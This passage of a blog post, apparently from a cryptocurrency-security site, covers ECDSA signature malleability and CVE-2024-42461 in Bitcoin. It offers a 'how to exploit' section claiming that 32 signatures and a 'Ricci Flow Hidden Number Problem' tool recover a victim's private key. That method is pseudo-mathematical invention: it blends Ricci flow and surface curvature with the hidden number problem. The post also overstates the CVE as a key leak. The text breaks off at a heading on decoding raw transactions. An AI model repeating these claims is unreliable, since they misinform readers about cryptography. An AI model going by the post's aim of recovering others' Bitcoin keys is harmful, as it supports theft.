<!-- wp:image -->
<figure class="wp-block-image"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/057-1024x576.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/057-1024x576.png"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A vulnerability known as Signature Malleability poses a serious threat to Bitcoin and Ethereum cryptocurrencies that use the Elliptic Curve Digital Signature Algorithm (ECDSA). This vulnerability allows attackers to manipulate signatures, creating invalid but acceptable signatures for the system. This article discusses the mechanisms of exploitation of this vulnerability, its implications for the security of cryptocurrencies, and proposed measures to mitigate it. ECDSA (Elliptic Curve Digital Signature Algorithm) is an algorithm that is widely used to create digital signatures for a BTC or ETH coin transfer transaction in Bitcoin and Ethereum cryptocurrencies. The signature consists of two components:&nbsp;&nbsp;<em><strong>r</strong></em>&nbsp;&nbsp;and&nbsp;&nbsp;<em><strong>s</strong></em>&nbsp;, which depend on a random nonce&nbsp;&nbsp;<em><strong>k</strong></em>&nbsp;&nbsp;(NONCE) and a private key&nbsp;<em><strong>x</strong></em>&nbsp;&nbsp;(PrivKey) of the signatory.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Tutorial: <a href="https://youtu.be/wf6QwCpP3oc">https://youtu.be/wf6QwCpP3oc</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Tutorial: <a href="https://cryptodeeptech.ru/signature-malleability">https://cryptodeeptech.ru/signature-malleability</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Google Colab: <a href="https://colab.research.google.com/drive/1HMmeEQDL4kRKfJNQptTf3Mz4VTZmka8h">https://colab.research.google.com/drive/1HMmeEQDL4kRKfJNQptTf3Mz4VTZmka8h</a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">How does Signature Malleability vulnerability occur in Bitcoin transaction?</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#how-does-signature-malleability-vulnerability-occur-in-bitcoin-transaction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Signature Malleability</strong>&nbsp;vulnerabilities&nbsp;&nbsp;arise because it is possible to change the value&nbsp;&nbsp;<em><strong>s</strong></em>&nbsp;&nbsp;in a signature while maintaining the validity of the signature. This is possible because multiple equivalent values&nbsp;&nbsp;<strong>​​(&nbsp;<em>r</em>&nbsp;,&nbsp;<em>s</em>&nbsp;′)</strong>&nbsp;can be obtained for the same signature :</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-1.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-1.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>(where&nbsp;&nbsp;<em><strong>n</strong></em>&nbsp;&nbsp;is the order of the elliptic curve group&nbsp;<em><strong>secp256k1</strong></em>&nbsp;). In this way, an attacker can create a new signature that will be accepted as valid by the system.&nbsp;<strong>Insufficient value checking</strong>&nbsp;: If the values ​​of&nbsp;&nbsp;<em><strong>r</strong></em>&nbsp;&nbsp;and&nbsp;&nbsp;<em><strong>s</strong></em>&nbsp;&nbsp;are not checked for valid ranges (e.g., must be between&nbsp;<strong>1</strong>&nbsp;and&nbsp;&nbsp;<em><strong>n</strong></em><strong>&nbsp;−1</strong>&nbsp;), this may allow attackers to use incorrect values ​​to create fake signatures.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42461">CVE-2024-42461: Signature Malleability in Elliptic Library for ECDSA</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#cve-2024-42461-signature-malleability-in-elliptic-library-for-ecdsa"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>One such vulnerability is&nbsp;<strong>CVE-2024-42461</strong>&nbsp;, discovered in the&nbsp;<strong><a href="https://www.npmjs.com/package/elliptic">Elliptic</a></strong>&nbsp;library used to implement&nbsp;<strong>the ECDSA</strong>&nbsp;(Elliptic Curve Digital Signature Algorithm) digital signature algorithm.&nbsp;</em>&nbsp;<em>CVE-2024-42461 affects&nbsp;<a href="https://www.npmjs.com/package/elliptic">version 6.5.6 of the Elliptic library for Node.js</a>&nbsp;and is classified as a low-severity vulnerability with a CVSS score of 5.3. The problem is that the library allows the use of signatures encoded in the&nbsp;<a href="https://keyhunters.ru/basic-encoding-rules/"><strong>BER (Basic Encoding Rules)</strong></a><a href="https://keyhunters.ru/basic-encoding-rules/">&nbsp;format<strong></strong></a>&nbsp;. This creates an opportunity for attackers to modify signatures without invalidating them, which opens the way for various attacks.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42461">https://nvd.nist.gov/vuln/detail/CVE-2024-42461</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>CVE-2024-42461 is a vulnerability found in the Elliptic library used to implement the Elliptic Curve Digital Signature Algorithm (ECDSA) in Node.js. This vulnerability is related to&nbsp;<strong>the Ricci Flow&nbsp;</strong><strong>Hidden Number Problem&nbsp;<em>(Ricci Flow HNP)</em></strong>&nbsp;, which makes it particularly important for the security of cryptographic applications.&nbsp;<strong>The Hidden Number Problem</strong>&nbsp;is a mathematical problem that consists of finding a hidden number used in the encryption process. In the context of ECDSA, if an attacker can solve the HNP, this can lead to the compromise of private keys. CVE-2024-42461 allows a potential attacker to extract information about private keys from signatures, which compromises the integrity of digital signatures and user authentication. This vulnerability opens up a wide range of attacks, as the vulnerability can be used in various attacks, including authentication and data integrity attacks. This could cause serious problems for systems that rely on ECDSA to secure Bitcoin and Ethereum cryptocurrency transactions.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong>Compromise of Private Keys</strong>&nbsp;: A successful&nbsp;<strong>Ricci Flow HNP</strong>&nbsp;solution could allow an attacker to gain access to private keys, leading to the ability to forge Bitcoin and Ethereum transaction signatures.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.youtube.com/watch?v=wf6QwCpP3oc"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt">Ricci Flow HNP</a></strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#ricci-flow-hnp"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>The Ricci Flow Hidden Number Problem (HNP&nbsp;</strong><em>)</em>&nbsp;has become a key tool in proving theorems such as&nbsp;<a href="https://en.wikipedia.org/wiki/Thurston_elliptization_conjecture">the Thurston elliptization conjecture</a>&nbsp;,&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Geometrization_conjecture">Geometrization conjecture</a>&nbsp;, and&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Poincar%C3%A9_conjecture">Poincaré conjecture</a>&nbsp;, which concern the topology of manifolds. Hamilton and later&nbsp;<a href="https://en.wikipedia.org/wiki/Grigori_Perelman">Grigori Perelman</a>&nbsp;used this approach to obtain deep results about the structure of manifolds, which can mean using flow to identify and analyze hidden geometric features of manifolds, allowing one to infer their topology and other properties.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The Ricci flow is closely related to curvature theory, since it uses the Ricci tensor to describe changes in the Riemannian metric on a manifold.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Basic Relationships Between Ricci Flow and Curvature</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#basic-relationships-between-ricci-flow-and-curvature"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Ricci Tensor:</strong> The Ricci flow is based on the Ricci tensor, which is the average of sectional curvatures. It reflects how the shape of a manifold changes with its curvature, where it is formulated as the problem of finding a hidden number when the results of a function applied to combinations of that number with known elements are known. This can be useful in the context of cryptography, especially in public-key systems where it is important to minimize leakage of information about private keys.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Curvature dynamics:</strong> During the Ricci flow, the metric changes in such a way that the curvature can increase or decrease. This allows us to analyze how the geometric properties of the manifold affect its topology.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Singularities:</strong> The Ricci flow can lead to singularities, points where the curvature becomes infinite. Studying these singularities is key to understanding the long-term behavior of the flow and its application to topological problems such as the Poincaré conjecture.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Maximum principle:</strong> The Ricci flow preserves the positivity of the scalar curvature, which allows us to use maximum principles to analyze the geometric properties of manifolds under deformation.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-12-1024x697.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-12-1024x697.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>In the context of elliptic curves, Ricci flows can be used to analyze their geometric properties and understand the relationships between different structures on these curves</em>&nbsp;.&nbsp;<em>The indicatrix of curvature,</em>&nbsp;&nbsp;or&nbsp;&nbsp;<em><a href="https://keyhunters.ru/dupins-indicatrix/">Dupin indicatrix</a></em>&nbsp;,&nbsp;<em>is constructed in the tangent plane at a given point on the surface according to the following rule. The coordinate axes in the tangent plane coincide with the principal directions. On the ray located in each direction, a segment is laid off equal to the reciprocal square root of the normal curvature of the surface in this direction</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Classification of surface points</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#classification-of-surface-points"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-13-1024x574.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-13-1024x574.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>There are surfaces consisting of points of one, two or three types.</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-14.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-14.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>This quadratic equation may have one or two roots — asymptotic directions, or no roots. The presence of a root provides an ordinary differential equation of the first order, the indication of a point on the surface sets the initial conditions for its solution. The theorem of the existence and uniqueness of the solution of the Cauchy problem for an ordinary differential equation of the first order, proved in courses on mathematical analysis, leads to the following geometric result. On a surface consisting of elliptical points, there are no real asymptotic lines; on a surface consisting of hyperbolic points, there is an asymptotic network; on a surface consisting of parabolic points that are not flattening points, a unique asymptotic line passes through each point.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong>Optimization of algorithms</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#optimization-of-algorithms"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The methods developed in the framework of Ricci flow theory can be adapted to optimize computations in elliptic curve cryptography, especially in the context of operations on points on elliptic curves secp256k1. Thus, the Ricci flow not only serves as a tool for studying the evolution of metrics, but also provides a deep connection between geometry and topology through curvature analysis. Take for example the numbers&nbsp;<strong>“N”</strong>&nbsp;and&nbsp;<strong>“P”</strong>&nbsp;which are important parameters in the context of elliptic curve cryptography, especially in the secp256k1 standard, which is widely used in the Bitcoin and Ethereum blockchain and cryptocurrency.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">The meaning of the number N</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#the-meaning-of-the-number-n"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>N</strong>&nbsp;is the order of the group of points on the elliptic curve. It determines the maximum number of points that can be used to generate keys in cryptographic algorithms. In the case of&nbsp;<strong>secp256k1</strong>&nbsp;, the value of&nbsp;<strong>N</strong>&nbsp;is:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>This number also indicates that when working with this curve, all operations must be performed within this order.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">The meaning of the number P</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#the-meaning-of-the-number-p"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>P</strong>&nbsp;is a characteristic of the elliptic curve itself, a prime number that defines the field in which the work on the points on the curve occurs. The value of&nbsp;<strong>P</strong>&nbsp;for&nbsp;<strong>secp256k1</strong>&nbsp;is:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>This number specifies the size of the field, which is important for determining the range of possible values ​​of the coordinates of points on the curve.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Difference between N and P</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#difference-between-n-and-p"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Group Order (N)</strong> : Determines the number of points on the curve that can be used for cryptographic operations.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Prime Number (P)</strong> : Defines the field in which the curve operates. This number is important for mathematical operations on points on the curve.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Thus, although both numbers play a key role in ensuring the security and functionality of cryptographic systems, they perform different functions:&nbsp;<strong>N</strong>&nbsp;concerns&nbsp;<em>the structure of a group of points</em>&nbsp;, and&nbsp;<strong>P</strong>&nbsp;concerns&nbsp;<em>the structure of a field</em>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Vertical position value of N and P</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#vertical-position-value-of-n-and-p"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/value_n.py">Python script: value_n.py</a></em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#python-script-value_npy"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-17.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-17.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/value_p.py">Python script: value_p.py</a></em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#python-script-value_ppy"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-18.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-18.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">How to exploit Signature Malleability in Bitcoin transaction?</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#how-to-exploit-signature-malleability-in-bitcoin-transaction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>To implement a full-fledged attack on Bitcoin using the&nbsp;<strong>Signature Malleability</strong>&nbsp;vulnerability, it is necessary to change the equivalent value&nbsp;&nbsp;<strong>(&nbsp;<em>s</em>&nbsp;′)</strong>&nbsp;as shown in the second column of the table of components&nbsp;<em>of the value&nbsp;<strong>(R, S, Z)</strong></em>&nbsp;<em>of the digital signature in&nbsp;<strong>ECDSA</strong></em>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt"></a><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt"><strong>36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>For a successful attack on Bitcoin,&nbsp;<em><strong>32</strong></em><strong>&nbsp;ECDSA</strong>&nbsp;signature transactions are enough&nbsp;, where by changing the two initial digits&nbsp;<strong>of HEX</strong>&nbsp;to the equivalent value&nbsp;&nbsp;<strong>(&nbsp;<em>s</em>&nbsp;′)</strong>&nbsp;we build a table to determine the range of possible values ​​of the coordinates of points on the curve, as well as optimizing the mathematical algorithms&nbsp;<em></em>developed within the framework of the Ricci flow theory. Since Ricci flows are closely related to the curvature theory, we can use the average value of the sectional curvature and solve the hidden number problem, where by applying the obtained data to&nbsp;<em><strong>32</strong></em>&nbsp;Bitcoin transactions we extract from the given values&nbsp;<em><strong>​​​​(R, S, Z)</strong></em>&nbsp;the initial data for&nbsp;<em>the secret keys</em>&nbsp;:&nbsp;<strong>(&nbsp;<em>k</em>&nbsp;′)</strong>&nbsp;NONCE for&nbsp;<em><strong>32</strong></em>&nbsp;Bitcoin transactions and using the&nbsp;<strong>Ricci Flow HNP&nbsp;</strong>&nbsp;<em>(Ricci Flow Hidden Number Problem)</em>&nbsp;tool &nbsp;we find the hidden number:&nbsp;<strong>(&nbsp;<em>x</em>&nbsp;′)</strong>&nbsp;PrivKey –&nbsp;<em>private key</em>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">The R and S values ​​are the main components of a digital signature in ECDSA</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#the-r-and-s-values-are-the-main-components-of-a-digital-signature-in-ecdsa"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong>The R</strong>&nbsp;value&nbsp;is the coordinate of a point on the elliptic curve that results from mathematical operations involving a private key and a random number (called a “cryptographic random number”). This value ensures that the signature is unique for each message, even if it is signed with the same private key.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The value of&nbsp;&nbsp;<strong>S</strong>&nbsp;&nbsp;is calculated based on the message digest (hash function) and the private key. It is related to how well the signature verifies the authenticity of the message. The value of&nbsp;&nbsp;<strong>S</strong>&nbsp;&nbsp;also depends on the value of&nbsp;<strong>R</strong>&nbsp;and the random number.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">How R and S are formed&nbsp;<em>(signature verification method)</em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#how-r-and-s-are-formedsignature-verification-method"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The process of generating R and S values ​​involves the following steps:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Generating a message digest</strong> : First, a hash of the message is created using an algorithm such as SHA-256.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Random Number Selection</strong> : A random number is generated and used to create a point on the elliptic curve.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Calculating R</strong> : Using this random number, the coordinate of a point on the curve is calculated, which becomes the R value.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Calculation of S</strong> : The value of S is calculated given the message digest and the private key.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>When verifying a signature, the recipient uses the R and S values ​​along with the sender’s public key and the message digest to verify the authenticity of the signature. If all calculations match, this means that the message was indeed signed by the owner of the corresponding private key.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>How to get R, S, Z</strong>&nbsp;value&nbsp;from&nbsp;<strong>RawTX&nbsp;</strong><em>(Signature Decoding Method)</em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#how-to-get-r-s-zvaluefromrawtxsignature-decoding-method"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong>RawTX</strong>&nbsp;is an encoded representation of a Bitcoin transaction in hexadecimal format. It contains all the data needed to complete a Bitcoin transaction.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Extract&nbsp;<strong>R, S, Z:</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#extractr-s-z"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>A signature in ECDSA consists of two components: <strong>R</strong> and <strong>S</strong> . After decoding <strong>RawTX,</strong> find the field containing the signature <em>(usually part of the transaction input).</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The signature will be represented as <em>a </em><strong>DER</strong> encoding . You will need to extract the <strong>R</strong> and <strong>S</strong> values ​​from this signature. They are usually represented as two integers, which can be extracted using <em><strong><a href="https://cryptodeeptech.ru/deserialize-signature-vulnerability-bitcoin/">deserialization</a></strong></em> .<em><strong><a href="https://cryptodeeptech.ru/deserialize-signature-vulnerability-bitcoin/"></a></strong></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>The Z</strong> value is a hash of the message being signed. To get Z, you have to hash the transaction data <em>(usually using SHA-256)</em> that was signed.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Decoding&nbsp;<strong>RawTX</strong>&nbsp;with&nbsp;<a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/tree/main/decoderaw"><strong>decoderaw tool</strong></a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
